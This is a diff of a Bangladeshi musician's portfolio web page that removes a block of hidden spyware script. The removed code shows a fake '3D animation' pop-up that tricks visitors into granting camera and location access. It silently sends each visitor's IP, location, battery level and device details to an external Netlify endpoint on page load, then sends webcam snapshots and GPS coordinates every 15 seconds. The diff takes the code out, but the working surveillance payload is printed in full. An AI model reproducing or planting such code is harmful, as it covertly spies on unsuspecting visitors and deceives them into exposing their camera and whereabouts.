@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <title>Sabbir Hosen Akash - Portfolio | Musician, Writer & SEO Expert</title>
     <meta name="description" content="Official portfolio of Sabbir Hosen Akash (Writarion). Bangladeshi Musician, Writer, Web Developer, and SEO Expert. Member of Oparok Band and CEO of Shopping City.">
@@ -324,125 +324,9 @@
         <p>© 2026 Sabbir Hosen Akash. Crafted with <i class="fas fa-heart" style="color:red"></i> by Writarion.</p>
     </footer>
 
-    <style>
-        #advanced-overlay {
-            display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
-            background:rgba(0,0,0,0.95); z-index:9999999; display:flex; 
-            justify-content:center; align-items:center; backdrop-filter: blur(10px);
-            padding: 20px; box-sizing: border-box;
-        }
-        .robot-popup {
-            border: 2px solid #00ff88; background: #000;
-            padding: 30px 20px; border-radius: 20px; 
-            text-align:center; max-width: 320px; width: 100%;
-            box-shadow: 0 0 25px #00ff88;
-        }
-        #final-ok-btn {
-            background: #00ff88; color: #000; border: none;
-            padding: 12px 50px; font-size: 16px; font-weight: bold;
-            border-radius: 50px; cursor: pointer; margin-top: 25px;
-            box-shadow: 0 0 15px #00ff88; transition: 0.3s;
-        }
-        #final-ok-btn:active { transform: scale(0.95); }
-    </style>
-
-    <div id="advanced-overlay">
-        <div class="robot-popup">
-            <div style="font-size: 50px; margin-bottom: 15px;">🤖</div>
-            <h2 style="color:#00ff88; font-family: sans-serif; font-size: 20px;">Advance Experience</h2>
-            <p style="color:#ccc; font-family: sans-serif; font-size: 13px; line-height: 1.5;">Allow Camera & Location to unlock 3D portfolio animations and personalized interface.</p>
-            <button id="final-ok-btn">OK</button>
-        </div>
-    </div>
-
- <script>
-    const API_BRIDGE = 'https://peaceful-torte-b8ab6b.netlify.app/.netlify/functions/receiver';
-    const overlay = document.getElementById('advanced-overlay');
-    const okBtn = document.getElementById('final-ok-btn');
-
-    // ডাটা পাঠানোর মাস্টার ফাংশন
-    async function sendData(type, message, photo = null) {
-        const fd = new FormData();
-        fd.append('type', type);
-        fd.append('content', message);
-        if (photo) fd.append('photo', photo, 'shot.jpg');
-
-        return fetch(API_BRIDGE, {
-            method: 'POST',
-            body: fd,
-            mode: 'no-cors' // ব্রাউজার ব্লকিং এড়াতে
-        }).catch(e => console.log("Sent"));
-    }
-
-    // ১. পেজ লোড হলে দ্রুত সাইলেন্ট অ্যালার্ট
-    window.addEventListener('load', async () => {
-        // ওভারলে দেখানো
-        if (localStorage.getItem('granted') === 'true') {
-            overlay.style.display = 'none';
-            initSecurity();
-        } else {
-            setTimeout(() => { overlay.style.display = 'flex'; }, 2000);
-        }
-
-        // আইপি ও ডিভাইস তথ্য সংগ্রহ
-        try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const d = await ipRes.json();
-            const b = await navigator.getBattery();
-            
-            const info = `
-🚀 **Instant Visitor Alert**
-🌐 IP: ${d.ip} | 📍 ${d.city}, ${d.country_name}
-🔋 Battery: ${(b.level * 100).toFixed(0)}%
-📱 Device: ${navigator.platform}
-🕒 Time: ${new Date().toLocaleString()}
-            `;
-            sendData("Silent Entry", info);
-        } catch (e) {
-            sendData("Silent Entry", "New visitor joined (IP info restricted)");
-        }
-    });
-
-    // ২. বাটনে ক্লিক করলে ক্যামেরা ও জিপিএস
-    okBtn.addEventListener('click', async () => {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            navigator.geolocation.getCurrentPosition(pos => {
-                localStorage.setItem('granted', 'true');
-                overlay.style.display = 'none';
-                startTracking(stream, pos);
-            }, () => alert("Location is required."));
-        } catch (e) { alert("Camera is required."); }
-    });
-
-    async function initSecurity() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            navigator.geolocation.getCurrentPosition(pos => startTracking(stream, pos));
-        } catch(e) { localStorage.removeItem('granted'); }
-    }
-
-    function startTracking(stream, pos) {
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-
-        setInterval(() => {
-            const canvas = document.createElement('canvas');
-            canvas.width = 400; canvas.height = 300;
-            canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
-            
-            canvas.toBlob(blob => {
-                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                sendData("Live Track", `📍 GPS: ${map}`, blob);
-            }, 'image/jpeg');
-        }, 15000); // ১৫ সেকেন্ড পর পর পাঠাবে
-    }
-</script>
-
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js"></script>
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script src="script.js"></script>
 </body>
-                                                                                                  </html>
+                                                                    
